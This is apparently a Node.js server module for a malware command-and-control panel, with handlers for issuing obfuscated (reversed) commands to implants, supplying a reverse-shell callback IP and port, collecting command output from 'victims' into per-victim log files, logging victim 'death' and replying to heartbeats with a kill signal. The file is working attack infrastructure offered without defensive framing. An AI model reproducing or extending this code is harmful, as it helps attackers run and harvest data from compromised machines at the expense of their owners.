const fs = require("fs");
const ip = require("ip");

function GETCMD(req, res) {

	console.log('hit1')
	const command = "shell"; 
	const reversed = reverser(command);
	const body = { command: reversed, timestamp: Date.now() };
	return res.send(body);
}

function Get_shell(req, res) {
	const ip = "10.10.10.10";
	const port = 4000;
	
	if (process.env.GET_SHELL == 'TRUE') {
		return res.send({status: true, ip: ip, port: port})
	} else {
		return res.send({status: false, message: 'die'})
	}
}

function funeral(req, res) {
	
	const status = req.query['status'];
	const ipv4 = ip.address();
	const currentDate = getCurrentDate();

	const log = "[LOG]: " + currentDate + "-----------------------VICTIM DEAD-------------------------";
	
	if (status == 'dead') {
		fs.appendFile("./victims/victim_" + ipv4 + "_.txt", log, (err) => {
			if (err) {
				throw err;
			} else {
				console.info("Written result to file successfully");
			}
		});
	}
	return res.send({ message: 'RIP' });
}

function heartbeat(req, res) {
	const heartbeat = req.body['heartbeat'];

	if (heartbeat == 'healthy') {
		console.log(heartbeat)
	} else if (heartbeat == ''){
		return res.send({ 'status': 'kill youself' })
	}
}

function recieve_result(req, res) {
	const result = req.query["result"];
	const ipv4 = ip.address();
	const currentDate = getCurrentDate();
	const log = "[LOG]: " + currentDate + ": " + result + "\n";

	fs.appendFile("./victims/victim_" + ipv4 + "_.txt", log, (err) => {
		if (err) {
			throw err;
		} else {
			console.info("Written result to file successfully");
		}
	});

	return res.send({ ok: "ok" });
}

function getCurrentDate() {
	const today = new Date();
	const day = String(today.getDate()).padStart(2, "0");
	const month = String(today.getMonth() + 1).padStart(2, "0"); // Months are zero-based
	const year = today.getFullYear();

	return `${day}/${month}/${year}`;
}

function reverser(cmd) {
	let reversed = "";
	for (let i = cmd.length - 1; i >= 0; i--) {
		reversed += cmd[i];
	}

	return reversed;
}

module.exports = {
	GETCMD: GETCMD,
	recieve_result: recieve_result,
	Get_shell,
	funeral
};
